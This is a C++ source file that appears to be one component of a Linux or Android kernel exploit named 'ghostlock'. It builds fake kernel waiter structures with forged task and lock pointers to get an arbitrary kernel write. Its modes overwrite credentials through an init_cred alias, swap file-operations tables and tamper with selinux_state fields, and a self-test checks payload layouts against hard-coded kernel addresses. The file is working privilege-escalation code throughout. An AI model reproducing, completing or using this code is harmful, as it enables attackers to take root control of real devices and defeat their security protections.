#include "payload_builder.h"

#include <string.h>

#include <algorithm>
#include <cstddef>
#include <span>

static void store64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

namespace ghostlock {

static bool span_store64(std::span<std::byte> bytes, size_t offset,
                         uint64_t value) noexcept {
  if (offset > bytes.size() || sizeof(value) > bytes.size() - offset) {
    return false;
  }
  memcpy(bytes.data() + offset, &value, sizeof(value));
  return true;
}

bool encode_compact_waiter(std::span<std::byte> waiter,
                           const WriteRequest &request,
                           const PayloadWriteLayout &layout) noexcept {
  if (waiter.size() < 0x30) return false;
  if (layout.right) {
    return span_store64(waiter, 0x18, layout.right) &&
           span_store64(waiter, 0x20, 0) &&
           span_store64(waiter, 0x28, request.target);
  }
  return span_store64(waiter, 0x18, layout.parent) &&
         span_store64(waiter, 0x20, layout.right) &&
         span_store64(waiter, 0x28, layout.left);
}

bool encode_multicast_waiter(std::span<std::byte> buffer,
                             size_t waiter_offset, size_t task_offset,
                             size_t lock_offset, uintptr_t fake_task,
                             uintptr_t fake_lock) noexcept {
  return span_store64(buffer, waiter_offset + task_offset, fake_task) &&
         span_store64(buffer, waiter_offset + lock_offset, fake_lock);
}

}  // namespace ghostlock

PayloadWriteLayout payload_write_layout(
    const WriteRequest *request, uintptr_t page_base,
    uintptr_t default_fops, uintptr_t credential_fops,
    uintptr_t init_cred_alias) {
  PayloadWriteLayout layout = {
    .fops = default_fops,
  };
  if (!request || request->mode == WRITE_MODE_DISABLED) return layout;

  if (request->preserve_child) {
    layout.right = request->mode == WRITE_MODE_CREDENTIAL
        ? init_cred_alias
        : page_base + 0x100;
  }
  if (request->mode == WRITE_MODE_CREDENTIAL) {
    layout.fops = credential_fops;
    layout.needs_credential_copy = 1;
  }
  layout.parent = request->target - 8;
  return layout;
}

void build_compact_waiter_payload(
    unsigned char *waiter, const WriteRequest *request,
    const PayloadWriteLayout *layout) {
  if (!waiter || !request || !layout) return;
  (void)ghostlock::encode_compact_waiter(
      {reinterpret_cast<std::byte *>(waiter), 0x30}, *request, *layout);
}

int payload_write_layout_matches_request(
    const WriteRequest *request, const PayloadWriteLayout *layout) {
  if (!request || !layout || request->mode == WRITE_MODE_DISABLED) return 0;
  return request->preserve_child ? layout->right != 0 : layout->right == 0;
}

int payload_write_layout_accepts_page(
    const WriteRequest *request, const PayloadWriteLayout *layout) {
  if (!payload_write_layout_matches_request(request, layout)) return 0;
  /* W1 stores its page-derived value across selinux_state fields. An even
   * byte 2 clears `initialized` and breaks every subsequent SID lookup. */
  if (request->mode == WRITE_MODE_ZERO && request->preserve_child &&
      ((layout->right >> 16) & 1) == 0) return 0;
  return 1;
}

void build_multicast_waiter_payload(
    unsigned char *buffer, size_t waiter_offset, size_t task_offset,
    size_t lock_offset, uintptr_t fake_task, uintptr_t fake_lock) {
  if (!buffer) return;
  const size_t required = waiter_offset +
      std::max(task_offset, lock_offset) + sizeof(uint64_t);
  (void)ghostlock::encode_multicast_waiter(
      {reinterpret_cast<std::byte *>(buffer), required}, waiter_offset,
      task_offset, lock_offset, fake_task, fake_lock);
}

static uint64_t load64(const unsigned char *p, size_t off) {
  uint64_t value;
  memcpy(&value, p + off, sizeof(value));
  return value;
}

int payload_builder_fixed_vector_test(void) {
  static const struct {
    uintptr_t target;
    WriteMode mode;
    int leaf;
    uintptr_t expected_pc;
    uintptr_t expected_left;
  } vectors[] = {
    {0xffffff8000123000ULL, WRITE_MODE_ZERO, 1,
     0xffffff8000122ff8ULL, 0},
    {0xffffff8000124000ULL, WRITE_MODE_ZERO, 0,
     0xffffff8800210100ULL, 0xffffff8000124000ULL},
    {0xffffff8000125000ULL, WRITE_MODE_CREDENTIAL, 0,
     0xffffff802abfd588ULL, 0xffffff8000125000ULL},
  };
  const uintptr_t page = 0xffffff8800210000ULL;
  const uintptr_t init_cred = 0xffffff802abfd588ULL;
  for (size_t i = 0; i < sizeof(vectors) / sizeof(vectors[0]); ++i) {
    unsigned char current[0x30] = {0};
    WriteRequest request = write_request_make(
        vectors[i].target, vectors[i].mode, vectors[i].leaf);
    PayloadWriteLayout layout = payload_write_layout(
        &request, page, 0x1111, 0x2222, init_cred);
    build_compact_waiter_payload(current, &request, &layout);
    if (load64(current, 0x18) != vectors[i].expected_pc ||
        load64(current, 0x20) != 0 ||
        load64(current, 0x28) != vectors[i].expected_left ||
        !payload_write_layout_matches_request(&request, &layout) ||
        !payload_write_layout_accepts_page(&request, &layout)) return 0;
  }
  WriteRequest w1 = write_request_make(
      0xffffff8000124000ULL, WRITE_MODE_ZERO, 0);
  PayloadWriteLayout rejected = payload_write_layout(
      &w1, 0xffffff8800200000ULL, 0x1111, 0x2222, init_cred);
  if (payload_write_layout_accepts_page(&w1, &rejected)) return 0;
  rejected.right = 0;
  if (payload_write_layout_matches_request(&w1, &rejected)) return 0;

  unsigned char legacy_stamp[0x80] = {0};
  unsigned char current_stamp[0x80] = {0};
  store64(legacy_stamp, 0x20 + 0x28, 0xffffff8800005800ULL);
  store64(legacy_stamp, 0x20 + 0x30, 0xffffff8800001000ULL);
  build_multicast_waiter_payload(
      current_stamp, 0x20, 0x28, 0x30,
      0xffffff8800005800ULL, 0xffffff8800001000ULL);
  if (memcmp(legacy_stamp, current_stamp, sizeof(legacy_stamp)) != 0) return 0;
  std::byte undersized[0x2f]{};
  if (ghostlock::encode_compact_waiter(undersized, w1, rejected)) return 0;
  return 1;
}
